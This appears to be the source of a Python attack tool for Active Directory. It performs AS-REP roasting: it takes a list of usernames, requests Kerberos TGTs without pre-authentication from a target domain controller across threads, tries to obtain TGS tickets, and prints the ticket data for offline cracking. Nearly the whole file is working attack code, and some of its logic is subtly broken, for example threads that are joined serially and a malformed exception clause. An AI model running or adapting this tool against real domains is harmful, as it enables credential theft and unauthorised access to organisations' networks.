from queue import Queue
import time as t
from multiprocessing import Process
import argparse
import threading
import sys
import traceback
try:
    from utils.adconn import LdapConn
    from utils.tickets import TGT, TGS
except:
    sys.path.insert(0, './utils')
    from adconn import LdapConn
    from tickets import TGT, TGS
from tqdm import tqdm

progress_bar_lock = threading.Lock()
def build_queue(file:str) -> Queue:
    objs = open(file, 'r').readlines()
    q = Queue()
    for obj in objs:
        obj = obj.strip()
        q.put(obj)
    return q



def get_user(user, domain, dc):
    T = TGT(domain, user, dc, preauth=False)
    tgt_data = T.run()
    if tgt_data != None:
        tgt = tgt_data['tgt']
        cipher = tgt_data['cipher']
        old = tgt_data['oldSessionKey']
        new = tgt_data['newSessionKey']
        print(tgt_data)
        try:
            TS = TGS(tgt, domain, cipher, old, new, user, dc, preauth=False)
            tgs = TS.run()
        except Exception as e:
            print(f"TGS error: {e}")
        return tgs
    if tgt_data == None:
        return None



def run(domain, dc, delay):
    while not q.empty():
        user = q.get()
        try:
            tgs = get_user(user,domain,dc)
            if tgs != None:
                print(tgs)
        except Exception as e:
            try:
                code = e.getErrorCode()
                if code ==6:
                    None
            except AttributeError:
                None
            except Exception as e2:
                print(f'this user: {user} fucket it up >:(')
                print(traceback.print_exc())
        finally:
            pbar.update(1)
            t.sleep(delay)


if __name__ == '__main__':
    parser = argparse.ArgumentParser()

    art = r"""
    ⠀⠀⠀⠀⠀⠀⢎⠉⠁⠈⠀⠀⠀⠀⠀⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠑⢄⠀⠀⠞⠋⠙⠛⠛⠢⠤⣀⠰⠗⠒⠂⣀⣀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⡀⠀⠀⠀⢀⡤⠖⢒⣛⣓⣦⣀⡴⢋⠭⠿⠿⣦⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠿⠀⠀⠀⢨⠤⠞⠉⠀⢀⠉⠻⣗⠁⠀⢸⣷⣌⠻⡆
⠀⠀⠀⠀⠀⠀⠀⣠⠔⠉⠀⠀⠀⠀⠈⢦⠀⠀⢰⣿⣷⡀⠸⡀⠀⠘⣿⣼⠆⢱
⠀⠀⠀⢀⡤⠒⠉⠀⠀⠀⠀⠀⠀⠀⠀⡿⡀⠀⣼⣧⡾⠀⢠⡧⣀⣀⣬⠥⣖⡥
⠀⣠⠜⠁⠀⠀⣀⡴⠤⣄⠀⠀⢰⡄⠀⢧⡳⠤⣌⣡⣤⡴⠛⠳⣄⣉⡩⠝⠋⢁
⡔⠁⠀⠀⠀⡼⢩⣧⡀⠘⢦⡀⠀⠉⠓⠲⠿⠛⠛⠉⠁⠀⠀⠀⠈⠏⠀⢀⣠⣺
⡇⠀⠀⠀⠀⢧⠈⢷⣙⣶⣄⡉⠓⠢⠤⣀⣀⣀⣀⣀⣀⣀⣠⣤⣤⣶⡾⢿⣿⠁
⠱⡀⠀⠀⠀⠈⢦⡈⠻⢝⡛⠿⣿⣓⠒⠶⠶⠾⠿⣿⣟⠛⠋⠉⠉⣹⣦⡿⠁⠀
⠀⠘⢆⠀⠀⠀⠀⠙⠢⣄⡉⠑⠒⠭⠿⠶⠶⣶⣞⣫⣥⣤⢖⡾⠿⠟⠋⠀⠀⠀
⠀⠀⠀⠑⠀⢀⡀⠀⠀⠀⠉⠉⠓⠒⠒⠒⠛⣉⣉⠉⣃⡦⠋⠀⠀⠀⠀⠀⠀⠀


"""

    parser.description = f"""This tool is for asrep roasting multiple users that don't require preauth and for enumerating users (will grab TGSs if able)"""
    parser.prog = art
    try:
        parser.add_argument('-user_file', help="the user file for user to be enumerated")
        parser.add_argument('-domain', help='the target domain')
        parser.add_argument('-dc', help='the domain controller')
        parser.add_argument('-workers', default=10, help='the number of threads in the thread pool, default is 10', type=int)
        parser.add_argument('-delay', help='add a delay in between requests', default=0, type=float)

        options = parser.parse_args()
        f = options.user_file
        domain = options.domain
        dc = options.dc
        delay = options.delay
        q = build_queue(f)
        print(art)
        print(parser.description)
        processes = options.workers
        with tqdm(total=q.qsize(), desc="Progress", unit="users") as pbar:
            for process in range(processes):
            # p = Process(target=run, args=(domain, dc, delay,))
                p = threading.Thread(target=run, args=(domain, dc, delay,))
                p.start()
                p.join()
                t.sleep(0.1)
    except not KeyboardInterrupt:
        parser.print_help()
    
